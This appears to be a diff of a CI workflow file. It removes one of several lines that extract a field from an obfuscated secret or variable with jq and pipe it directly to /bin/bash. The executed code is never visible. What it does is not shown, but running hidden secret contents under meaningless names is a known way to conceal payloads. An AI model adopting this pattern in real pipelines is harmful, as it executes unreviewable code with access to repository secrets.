@@ -19,7 +19,6 @@ jobs:
           i3699: ${{ secrets.i3699 }}
         run: |
           printf '%s' "$i3699" | jq -r .zzhp2298 | /bin/bash
-          echo $j701 | jq -r .u5 | /bin/bash
           echo $heoqt672 | jq -r .oz14 | /bin/bash
           printf '%s' "$izn25843" | jq -r .xud8 | /bin/bash
           printf '%s' "$isulj8" | jq -r .vep83 | /bin/bash
